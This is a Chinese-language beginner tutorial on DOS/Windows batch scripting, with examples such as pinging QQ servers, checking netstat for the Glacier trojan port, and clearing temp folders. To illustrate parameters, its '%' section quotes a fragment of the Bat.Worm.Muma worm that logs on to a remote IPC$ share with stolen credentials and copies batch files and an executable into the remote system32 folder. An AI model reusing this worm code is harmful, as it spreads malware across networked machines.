# 一、概述

批处理的本质，是一堆DOS命令按一定顺序排列而形成的集合。

批处理了脚本构成没有固定格式，只要遵守以下这条就 ok 了：**每一行可视为一个命令，每个命令里可以含多条子命令，从第一行开始执行，直到最后一行结束，它运行的平台是 DOS。**

批处理有一个很鲜明的特点：使用方便、灵活，功能强大，自动化程度高。

# 二、实例与解析

## 例一：速度最快的 QQ 服务器

```cmd
ping sz.tencent.com > D:\a.txt
ping sz1.tencent.com >> D:\a.txt
ping sz2.tencent.com >> D:\a.txt
ping sz3.tencent.com >> D:\a.txt
ping sz4.tencent.com >> D:\a.txt
ping sz5.tencent.com >> D:\a.txt
ping sz6.tencent.com >> D:\a.txt
ping sz7.tencent.com >> D:\a.txt
exit
```

保存为 `name.bat` 然后执行。执行这个批处理后，在D:\盘建立记录信息的文件。

- **>** : 把前面命令得到的东西放到后面所给的地方
- **>>** :把结果追加到前一行得出的结果的后面。

## 例二：删除 QQ 的广告

```cmd
@echo off
if exist C:\Progra~1\Tencent\AD.gif del C:\Progra~1\Tencent\AD.gif
a.bat
```

这是个过时的例子，它的作用是删除 QQ 的广告，让对话框干干净净。这里用的地址是 QQ 的默认安装地址，默认批处理文件名为`a.bat`，你当然可以根据情况自行修改。在这个脚本中使用了 if 命令，使得它可以达到适时判断和删除广告图片的效果，你只需要不关闭命令执行后的 DOS 窗口，不按 `CTRL+C` 强行终止命令，它就一直监视是否有广告图片（ QQ 也再不断查看自己的广告是否被删除）。



## 例三：使用批处理脚本查是否中冰河。

```cmd
@echo off
netstat -a -n > a.txt
type a.txt | find "7626" && echo "Congratulations! You have infected GLACIER!"
del a.txt
pause & exit
```

## 例四：借批处理自动清除系统垃圾

```cmd
@echo off
if exist c:\windows\temp. del c:\windows\temp\.
if exist c:\windows\Tempor~1. del c:\windows\Tempor~1\.
if exist c:\windows\History. del c:\windows\History\.
if exist c:\windows\recent. del c:\windows\recent\.
```

将以上脚本内容保存到`autoexec.bat`里，每次开机时就把系统垃圾给自动删除了。DOS 不支持长文件名，所以就出现了`Tempor~1`。

# 三、命令讲解

## 1.@

让执行窗口中不显示它后面这一行的命令本身，即行首有了它的话，这一行的命令就不显示了。`@echo off`中，`@`的作用就是让脚本在执行时不显示后面的`echo off`部分。

## 2.echo

一个开关命令，就是说它只有两种状态：打开和关闭。于是就有了`echo on`和`echo off`两个命令了。

直接执行`echo`命令将显示当前`echo`命令状态（`off`或`on`）执行`echo off`将关闭回显，它后面的所有命令都不显示命令本身，只显示执行后的结果，除非执行`echo on`命令。

- 可以用它来显示信息，如”echo  xxxx"

- 可以直接编辑文本文件。

  ```cmd
  echo nbtstat -A 192.168.0.1 > a.bat
  echo nbtstat -A 192.168.0.2 >> a.bat
  echo nbtstat -A 192.168.0.3 >> a.bat
  ```

## 3. ::

这个命令的作用很简单，它是注释命令，在批处理脚本中和`rem`命令等效。它后面的内容在执行时不显示，也不起任何作用，因为它只是注释，只是增加了脚本的可读性，和C语言中的`/…………/`类似.

## 4. ':' 和'goto'

`goto`是个跳转命令，`:`是一个标签。当程序运行到`goto`时，将自动跳转到`:`定义的部分去执行了。

```
……
goto end
……
:end
```

## 5.pause

让当前程序进程暂停一下，并显示一行信息：请按任意键继续. . .。

## 6.%

```cmd
net use \%1\ipc$ %3 /u:"%2"
copy 11.BAT \%1\admin$\system32 /y
copy 13.BAT \%1\admin$\system32 /y
copy ipc2.BAT \%1\admin$\system32 /y
copy NWZI.EXE \%1\admin$\system32 /y
attrib \%1\admin$\system32\10.bat -r -h -s
```

以上代码是 Bat.Worm.Muma 病毒中的一部分，%1代表的IP，%2代表的username，%3代表password。执行形式为：脚本文件名 参数一 参数二 ……。

假设这个脚本被保存为a.bat，则执行形式如下：a IP username password。这里IP、username、password是三个参数，缺一不可（因为程序不能正确运行）。

## 7、if

表示判断的命令。

```cmd
IF [NOT] ERRORLEVEL number do command
IF [NOT] string1==string2 do command
IF [NOT] EXIST filename do command
```

## 8.call

call命令用来从一个批处理脚本中调用另一个批处理脚本。在调用脚本时可以直接加入参数。

```cmd
call a.bat
```

## 9.find

搜索命令，用来在文件中搜索特定字符串，通常也作为条件判断的铺垫。如果没有指定路径，find将搜索键入的或者由另一个命令产生的文字。

## 10.for、set、shift

